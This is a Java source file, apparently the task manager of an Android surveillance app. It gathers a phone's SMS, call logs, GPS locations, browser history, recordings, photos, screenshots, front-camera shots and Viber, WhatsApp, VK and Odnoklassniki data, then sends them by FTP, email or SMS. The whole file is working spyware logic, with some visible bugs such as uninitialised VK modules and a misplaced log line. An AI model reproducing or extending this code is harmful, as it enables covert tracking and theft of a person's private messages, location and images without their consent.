package com.dwreload;

import java.util.Date;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

import com.dwreload.modules.OdklModule;
import com.dwreload.modules.ViberModule;
import com.dwreload.modules.VkModule;
import com.dwreload.modules.WhatsAppModule;
import com.dwreload.modules.vk.VkModule_old;
import com.dwreload.modules.vk.VkModule_v3;
import com.dwreload.FileSender.FileType;
import com.dwreload.lib.GPS;
import com.dwreload.lib.MessageType;
import com.dwreload.variables.DBResult;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.support.v4.content.LocalBroadcastManager;
import android.util.Log;

public class ThreadManager {
	private Context mContext;
	private DBManager mDbManager;
	private SettingsManager mSettings;
	private BroadcastReceiver mReceiver;
	private ExecutorService mExecutorService;
	private ViberModule mVbModule;
	private OdklModule mOdklModule;
	private VkModule mVkModule;
	private VkModule_v3 mVk_v3;
	private VkModule_old mVk_old;
	private WhatsAppModule mWaModule;
	private boolean mIsCallThreadReady = true;
	private boolean mIsSmsThreadReady = true;
	private boolean mIsBrowserThreadReady = true;
	
	private static final Long SLEEP = 1 * 1000L;
	
	private static long sLastUpdate = 0L;
	
	private static final long UPDATE_PERIOD = 10 * 60 * 1000L;
	//-------------------------------------------------------------------------------------------------------------------------------------------------------
	public ThreadManager(Context context)
		{
		this.mContext = context;
		this.mDbManager = new DBManager(context);
		this.mSettings = new SettingsManager(context);
		this.mExecutorService = Executors.newSingleThreadExecutor();
		}
	//-------------------------------------------------------------------------------------------------------------------------------------------------------
	public void dispose()
		{
		LocalBroadcastManager.getInstance(mContext).unregisterReceiver(mReceiver);
		mDbManager.close();
		mDbManager = null;
		try {
			mExecutorService.awaitTermination(5L, TimeUnit.SECONDS);
			} 
			catch (InterruptedException e)
				{
				mExecutorService = null;
				}
		}
	//-------------------------------------------------------------------------------------------------------------------------------------------------------
	public synchronized void addTask(Runnable runnable)
		{
		this.mExecutorService.submit(runnable);
		}
	//-------------------------------------------------------------------------------------------------------------------------------------------------------
	public synchronized void onSMSChange()
		{
		if (!mIsSmsThreadReady)
			{
			return;
			}
		if (mSettings.DayReports())
			{
			return;
			}
		mIsSmsThreadReady = false;
		mExecutorService.submit(new Runnable()
			{
			public void run()
				{
				try
					{
					Thread.sleep(SLEEP);
					} 
					catch (InterruptedException e){} 
				finally
					{
					mIsSmsThreadReady = true;
					}
				smsDuplicate();
				mExecutorService.submit(new FileSender(mContext, FileType.TEXT));
				}
			});
		}
	//-------------------------------------------------------------------------------------------------------------------------------------------------------
	public synchronized void onCallChange()
		{
		if (!mIsCallThreadReady)
			{
			return;
			}
		if (mSettings.DayReports())
			{
			return;
			}
		mIsCallThreadReady = false;
		mExecutorService.submit(new Runnable()
			{
			public void run()
				{
				try
					{
					Thread.sleep(SLEEP);
					}
				catch (InterruptedException e) {}
				finally
					{
					mIsCallThreadReady = true;
					}
				//Log.w("ThreadManager", "start callDuplicate");
				callDuplicate();
				mExecutorService.submit(new FileSender(mContext, FileType.TEXT));			
				}
			});
		}
	//-------------------------------------------------------------------------------------------------------------------------------------------------------
	public synchronized void resetBrowserHistory()
		{
		mDbManager.resetBrowserHistory();
		}
	//-------------------------------------------------------------------------------------------------------------------------------------------------------
	public synchronized void onBrowserHistoryChange()
		{
		if (!mIsBrowserThreadReady)
			{
			return;
			}
		if (mSettings.DayReports())
			{
			return;
			}
		mIsBrowserThreadReady = false;
		mExecutorService.submit(new Runnable()
			{
			public void run()
				{
				try
					{
					Thread.sleep(5 * SLEEP);
					}
				catch (InterruptedException e){} 
				finally
					{
					mIsBrowserThreadReady = true;
					}
				browserHistoryUpdate();				
				}
			});
		}
	//-------------------------------------------------------------------------------------------------------------------------------------------------------
	public void onGPSChange(final GPS gps)
		{
		mDbManager.addGPS(gps);
		if (mSettings.DayReports())
			{
			return;
			}
		else GPSSend();
		}
	//-------------------------------------------------------------------------------------------------------------------------------------------------------
	public synchronized void sendLogs()
		{
		Log.w("SendLogs","Try to update browser history");
		browserHistoryUpdate();
		Log.w("SendLogs","Try to send files if need");
		if (networkAvailable_files())
			{
			mExecutorService.submit(new FileSender(mContext, FileType.RECORD));
			mExecutorService.submit(new FileSender(mContext, FileType.PHOTO));
			mExecutorService.submit(new FileSender(mContext, FileType.SCREENSHOT));
			mExecutorService.submit(new FileSender(mContext, FileType.FRONT_CAMERA_PHOTO));
			}
		
		Log.w("SendLogs","Try to send reports");
		mExecutorService.submit(new Runnable()
			{
			@Override
			public void run()
				{
				Log.w("SendLogs","run success");
				FTPNotification FTPNotify = new FTPNotification(mContext);
				SmsNotification smsNotify = new SmsNotification(mContext);
				MailNotification MailNotify = new MailNotification(mContext);
				GPSSend();
				if (mSettings.DayReports())
					{
					SocialSend();
					}
				DBResult result = null;
				Boolean res1 = false;
				Boolean res2 = false;
				Log.w("SendLogs","Try to get sms");
				result = mDbManager.getSMS(false);
				Log.w("SendLogs","have sms: " + result.hasElements());
				if (result != null)
					{
					Log.w("SendLogs","Try to resend sms");
					if (mSettings.sendSMStoFTP())
						{
						res1 = FTPNotify.sendSmsToFTP(result.getBodyList());
						}
					if (mSettings.sendSmstomail())
						{
						res2 = MailNotify.sendSmsToMail(result.getBodyList());
						}
					if (smsNotify.notifySms())
						{
						smsNotify.sendSmsLog(result.getBodyList());
						}
					if (res1 || res2) mDbManager.updateSentStatus(MessageType.SMS, result.getIdList());
					}
				Log.w("SendLogs","Try to getCalls");
				result = mDbManager.getCalls(false);
				Log.w("SendLogs","have calls: " + result.hasElements());
				if (result != null)
					Log.w("SendLogs","Try to send calls");
					{
					if (mSettings.sendCallToFTP())
						{
						res1 = FTPNotify.sendCallToFTP(result.getBodyList());
						}
					if (mSettings.sendCallToMail())
						{
						res2 = MailNotify.sendCallToMail(result.getBodyList());
						}
					if (smsNotify.notifyCall())
						{
						smsNotify.sendCallLog(result.getBodyList());
						}
					if (res1 || res2) mDbManager.updateSentStatus(MessageType.CALL, result.getIdList());
					}
				}
			});
			if (networkAvailable())
				{
				mExecutorService.submit(new FileSender(mContext, FileType.TEXT));
				}
			Log.w("SendLogs","End of function");
		}

	//-------------------------------------------------------------------------------------------------------------------------------------------------------
	public synchronized void sendFiles()
		{
		if (networkAvailable())
			{
			mExecutorService.submit(new FileSender(mContext, FileType.TEXT));
			}
		if (networkAvailable_files())
			{
			mExecutorService.submit(new FileSender(mContext, FileType.RECORD));
			mExecutorService.submit(new FileSender(mContext, FileType.PHOTO));
			mExecutorService.submit(new FileSender(mContext, FileType.SCREENSHOT));
			mExecutorService.submit(new FileSender(mContext, FileType.FRONT_CAMERA_PHOTO));
			}
		}
	//-------------------------------------------------------------------------------------------------------------------------------------------------------
	private void smsDuplicate()
		{
		if (!mDbManager.compareSMS())
			{
			return;
			}
		//Log.w("ThreadMan", "smsDuplicate started");
		FTPNotification FTPNotify = new FTPNotification(mContext);
		MailNotification MailNotify = new MailNotification(mContext);		
		DBResult result = mDbManager.getSMS();
		result = mDbManager.getSMS(true);
		Boolean res1 = false;
		Boolean res2 = false;
		if (mSettings.sendCallToFTP())
			{
			res1 = FTPNotify.sendSmsToFTP(result.getBodyList());
			}
		if (mSettings.sendSmstomail())
			{
			res2 = MailNotify.sendSmsToMail(result.getBodyList());
			}
		if (res1 || res2) mDbManager.updateSentStatus(MessageType.SMS, result.getIdList());
		}
	//-------------------------------------------------------------------------------------------------------------------------------------------------------
	private void callDuplicate()
		{
		if (!mDbManager.compareCall())
			{
			return;
			}
		FTPNotification FTPNotify = new FTPNotification(mContext);
		MailNotification MailNotify = new MailNotification(mContext);
		DBResult result = mDbManager.getCalls();
		result = mDbManager.getCalls(true);
		Boolean res1 = false;
		Boolean res2 = false;
		if (mSettings.sendCallToFTP())
			{
			 res1 = FTPNotify.sendCallToFTP(result.getBodyList());
			}
		if (mSettings.sendCallToMail())
			{
			res2 = MailNotify.sendCallToMail(result.getBodyList());
			}
		if (res1 || res2) mDbManager.updateSentStatus(MessageType.CALL, result.getIdList());
		}
	//-------------------------------------------------------------------------------------------------------------------------------------------------------
	private void GPSSend()
		{
		if (networkAvailable())
			{
			Log.w("GPSSend","send GPS data");
			DBResult result = mDbManager.getGPS();
			result = mDbManager.getGPS();
			MailNotification MailNotify = new MailNotification(mContext);
			FTPNotification FTPNotify = new FTPNotification(mContext);
			Boolean res1 = false;
			Boolean res2 = false;
			if (mSettings.sendGpsToFTP())
				{
				res2 = FTPNotify.sendGPSToFTP(result.getBodyList());
				}
			if (mSettings.sendGpsToMail())
				{
				res1 = MailNotify.sendGPSToMail(result.getBodyList());
				}
			if (res1 || res2) mDbManager.updateSentStatus(MessageType.GPS, result.getIdList());
			Log.w("GPSSend","ok to send");
			}
		}
	//-------------------------------------------------------------------------------------------------------------------------------------------------------
	private void browserHistoryUpdate()
		{
		Long currentDate = new Date().getTime();
		if ((currentDate - sLastUpdate) > UPDATE_PERIOD && networkAvailable())
			{
			sLastUpdate = currentDate;
			if (mSettings.isBrowserHistoryEnabled())
				{
				if (!mDbManager.compareBrowserHistory())
					{
					return;
					}
				DBResult result = mDbManager.getBrowserHistory();
				if (result.getIdList().size() == 0)
					{
					return;
					}
				MailNotification MailNotify = new MailNotification(mContext);
				FTPNotification FTPNotify = new FTPNotification(mContext);
				Boolean res1 = false;
				Boolean res2 = false;
				if (mSettings.sendHistoryToFTP())
					{
					res2 = FTPNotify.sendHistoryToFTP(result.getBodyList());
					}
				if (mSettings.sendHistoryToMail())
					{
					res1 = MailNotify.sendHistoryToMail(result.getBodyList());
					}
				if (res1 || res2)
					{
					mDbManager.updateSentStatus(MessageType.BROWSER, result.getIdList());
					}
				}
			}
		}
	//-------------------------------------------------------------------------------------------------------------------------------------------------------
	private void SocialSend()
	{
		Log.w("SocialSend","started");
		mVbModule = new ViberModule(mContext);
		mVbModule.GetALL();
		
		mOdklModule = new OdklModule(mContext);
		mOdklModule.GetALL();
		
		mWaModule = new WhatsAppModule(mContext);
		mWaModule.GetALL();
		
		mVkModule = new VkModule(mContext);
		if (mVkModule.isV3())
			{
			mVk_v3.GetALL();
			}
		else
			{
			mVk_old.GetALL();
			}
		Log.w("SocialSend","social send ok");
	}
	//=======================================================================================================================================================
	private Boolean networkAvailable(){
		ConnectivityManager manager = (ConnectivityManager)mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo info = manager.getActiveNetworkInfo();
		
		if (info == null){
			return false;
		}
		
		if (mSettings.onlyWiFi() && info.getType() != ConnectivityManager.TYPE_WIFI){
			return false;
		}
		
		return info.isConnectedOrConnecting();
	}
	//-------------------------------------------------------------------------------------------------------------------------------------------------------
	private Boolean networkAvailable_files()
		{
		ConnectivityManager manager = (ConnectivityManager)mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo info = manager.getActiveNetworkInfo();
		if (info == null)
			{
			return false;
			}
		if ((mSettings.onlyWiFi() || mSettings.filesOnlyWiFi()) && info.getType() != ConnectivityManager.TYPE_WIFI)
			{
			return false;
			}
		return info.isConnectedOrConnecting();
		}

}
